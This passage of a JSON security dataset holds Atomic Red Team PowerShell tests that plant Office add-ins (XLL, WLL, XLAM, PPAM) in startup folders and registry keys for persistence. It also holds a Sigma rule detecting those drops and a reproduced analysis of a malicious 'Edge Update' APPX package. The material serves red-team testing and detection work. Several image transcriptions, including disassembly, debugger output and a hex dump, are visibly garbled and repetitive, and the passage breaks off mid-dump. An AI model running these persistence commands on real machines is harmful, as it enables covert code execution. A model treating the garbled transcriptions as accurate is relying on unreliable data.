Write-Host \"32-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n```\n\n#### Cleanup Commands:\n\n```\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\n```\n\n---\n\n### Atomic Test #3 - Persistent Code Execution Via Word Add-in File (WLL)\n\nCreates a Word Add-in file (WLL) which runs automatically when Word is started. The sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 95408a99-4fa7-4cd6-a7ef-cb65f86351cf\n\n#### Attack Commands: Run with `powershell`!\n\n```\n$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))\n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"      \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\"\nStart-Process \"WinWord\"\n```\n\n#### Cleanup Commands:\n\n```\nStop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\n```\n\n---\n\n### Atomic Test #4 - Persistent Code Execution Via Excel VBA Add-in File (XLAM)\n\nCreates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started. The sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 082141ed-b048-4c86-99c7-2b8da5b5bf48\n\n#### Attack Commands: Run with `powershell`!\n\n```\nCopy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"      \nStart-Process \"Excel\"\n```\n\n#### Cleanup Commands:\n\n```\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\n```\n\n---\n\n### Atomic Test #5 - Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)\n\nCreates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started. The sample PPAM provided launches the notepad as a proof-of-concept for persistent execution from Office.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** f89e58f9-2b49-423b-ac95-1f3e7cfd8277\n\n#### Attack Commands: Run with `powershell`!\n\n```\nCopy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n```\n\n#### Cleanup Commands:\n\n```\nStop-Process -Name \"notepad\",\"PowerPnt\" -ErrorAction Ignore\n```",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Add-In",
      "id": "8e1cb247-6cf6-42fa-b440-3f27d57e9936",
      "status": "test",
      "description": "Detects potential persistence activity via startup add-ins that load when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel).",
      "references": [
        "Internal Research",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md"
      ],
      "author": "NVISO",
      "date": "2020-05-11",
      "modified": "2023-02-08",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_wlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Word\\Startup\\",
          "TargetFilename|endswith": ".wll"
        },
        "selection_xlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Excel\\Startup\\",
          "TargetFilename|endswith": ".xll"
        },
        "selection_xladropped": {
          "TargetFilename|contains": "Microsoft\\Excel\\XLSTART\\",
          "TargetFilename|endswith": ".xlam"
        },
        "selection_generic": {
          "TargetFilename|contains": "\\Microsoft\\Addins\\",
          "TargetFilename|endswith": [
            ".xlam",
            ".xla",
            ".ppam"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate add-ins"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_addin_persistence.yml"
  },
  "23": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n 